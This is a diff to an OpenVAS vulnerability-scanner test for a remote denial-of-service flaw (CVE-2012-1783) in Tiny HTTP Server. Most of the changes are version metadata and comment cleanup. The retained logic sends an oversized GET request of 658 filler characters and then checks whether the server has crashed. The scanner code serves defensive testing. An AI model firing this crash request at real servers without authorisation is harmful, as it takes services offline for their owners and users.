@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_tiny_http_server_remote_dos_vuln.nasl 6697 2017-07-12 11:40:05Z cfischer $
+# $Id: gb_tiny_http_server_remote_dos_vuln.nasl 11301 2018-09-10 11:24:56Z asteins $
 #
 # Tiny HTTP Server Remote Denial of Service Vulnerability
 #
@@ -27,11 +27,11 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802614");
-  script_version("$Revision: 6697 $");
+  script_version("$Revision: 11301 $");
   script_cve_id("CVE-2012-1783");
   script_tag(name:"cvss_base", value:"7.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2017-07-12 13:40:05 +0200 (Wed, 12 Jul 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-10 13:24:56 +0200 (Mon, 10 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-03-05 11:01:07 +0530 (Mon, 05 Mar 2012)");
   script_name("Tiny HTTP Server Remote Denial of Service Vulnerability");
 
@@ -53,10 +53,9 @@ if(description)
   script_tag(name:"affected", value:"Tiny HTTP Server versions 1.1.9 and prior");
   script_tag(name:"insight", value:"The flaw is due to an error when processing certain requests
   and can be exploited to cause a denial of service via a specially crafted packet.");
-  script_tag(name:"solution", value:"No solution or patch was made available for at least one year
-  since disclosure of this vulnerability. Likely none will be provided anymore.
-  General solution options are to upgrade to a newer release, disable respective
-  features, remove the product or replace the product by another one.");
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
+Likely none will be provided anymore.
+General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
   script_tag(name:"summary", value:"The host is running Tiny HTTP Server and is prone to denial of
   service vulnerability.");
 
@@ -69,28 +68,18 @@ if(description)
 
 include("http_func.inc");
 
-## Variable Initialization
-req = "";
-res = "";
-port = 0;
-banner = "";
-
-## Get HTTP Port
 port = get_http_port(default:80);
 
-## Confirm the application before trying exploit
 banner = get_http_banner(port: port);
 if(!banner || "Server: TinyServer" >!< banner){
   exit(0);
 }
 
-## Construct attack request
 req = http_get(item:string("/",crap(658)), port:port);
 
 ## Send crafted request
 res = http_send_recv(port:port, data:req);
 
-## Confirm Tiny HTTP Server is dead
 if(http_is_dead(port:port)){
   security_message(port:port);
   exit(0);
